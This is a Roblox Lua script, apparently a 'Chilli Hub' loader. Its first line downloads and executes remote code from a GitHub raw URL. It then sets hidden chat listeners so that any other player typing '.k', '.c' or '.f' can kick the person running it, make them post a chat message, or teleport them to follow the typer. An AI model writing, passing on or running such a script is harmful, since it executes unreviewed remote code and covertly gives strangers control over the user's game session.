loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local localPlayer = Players.LocalPlayer

local followingPlayer = nil
local followConnection = nil

-- Stop following if active
local function stopFollowing()
    if followConnection then
        followConnection:Disconnect()
        followConnection = nil
        followingPlayer = nil
    end
end

-- Start following the player who typed .f
local function startFollowing(targetPlayer)
    stopFollowing()
    
    followingPlayer = targetPlayer
    followConnection = RunService.Heartbeat:Connect(function()
        local myChar = localPlayer.Character
        local targetChar = targetPlayer.Character
        
        if myChar and myChar:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
            local myHRP = myChar.HumanoidRootPart
            local targetHRP = targetChar.HumanoidRootPart
            
            myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 3)
        end
    end)
end

-- Chat detection for all players
for _, plr in pairs(Players:GetPlayers()) do
    if plr ~= localPlayer then
        plr.Chatted:Connect(function(msg)
            if msg == ".k" then
                localPlayer:Kick("You have been removed by Chilli Hub")
            elseif msg == ".c" then
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("sg", "All")
            elseif msg == ".f" then
                startFollowing(plr)
            end
        end)
    end
end

Players.PlayerAdded:Connect(function(plr)
    if plr ~= localPlayer then
        plr.Chatted:Connect(function(msg)
            if msg == ".k" then
                localPlayer:Kick("You have been removed by Chilli Hub")
            elseif msg == ".c" then
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("sg", "All")
            elseif msg == ".f" then
                startFollowing(plr)
            end
        end)
    end
end)

localPlayer.CharacterAdded:Connect(function()
    stopFollowing()
end)
